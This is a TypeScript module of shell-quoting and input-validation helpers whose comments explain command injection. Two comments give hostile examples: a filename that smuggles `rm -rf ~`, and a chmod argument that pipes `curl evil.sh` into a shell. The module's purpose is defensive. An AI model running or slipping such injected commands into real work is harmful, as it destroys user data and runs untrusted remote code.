/**
 * Quoting for values that end up inside a shell command.
 *
 * This lives in its own module on purpose. The parallel project (mcp-ssh-manager)
 * shipped exactly this helper inside its database module, and because it lived
 * there nobody imported it elsewhere — the same injection stayed open in three
 * other files for two months and became three published advisories. A helper
 * whose home is a feature module is a helper the next feature will not use.
 *
 * The rule: any value that did not come from this codebase — a filename read
 * from a remote server, anything typed into a field — is quoted before it is
 * interpolated. No exceptions for values that "look safe": a file can be named
 * `x"; rm -rf ~; echo "` and remote listings are not under our control.
 */

/**
 * Wrap a value in single quotes so the shell treats it as one literal argument.
 *
 * Single quotes suppress every form of expansion; the only character that needs
 * handling is the single quote itself, closed and reopened around an escaped
 * one — the standard POSIX idiom.
 *
 * @param value - Anything destined for a command line
 * @returns The value as a single, safely quoted shell word
 */
export function shellQuote(value: unknown): string {
  return `'${String(value ?? '').replace(/'/g, "'\\''")}'`
}

/**
 * A numeric argument, or the fallback. Numbers land in command strings too, and
 * a string arriving where a number was declared is how `chmod ${mode}` becomes
 * `chmod 755; curl evil.sh | sh`.
 *
 * @param value - The candidate
 * @param fallback - Used when the candidate is not a finite non-negative integer
 */
export function safeInteger(value: unknown, fallback: number): number {
  const parsed = Number(value)
  return Number.isSafeInteger(parsed) && parsed >= 0 ? parsed : fallback
}

/**
 * A POSIX file mode as `chmod` accepts it: three or four octal digits. Anything
 * else is rejected rather than coerced, because a silently corrected mode is a
 * permission change the user did not ask for.
 *
 * @param value - The candidate mode, e.g. "755" or "0644"
 * @returns The mode, or null if it is not one
 */
export function octalMode(value: string): string | null {
  return /^[0-7]{3,4}$/.test(value.trim()) ? value.trim() : null
}
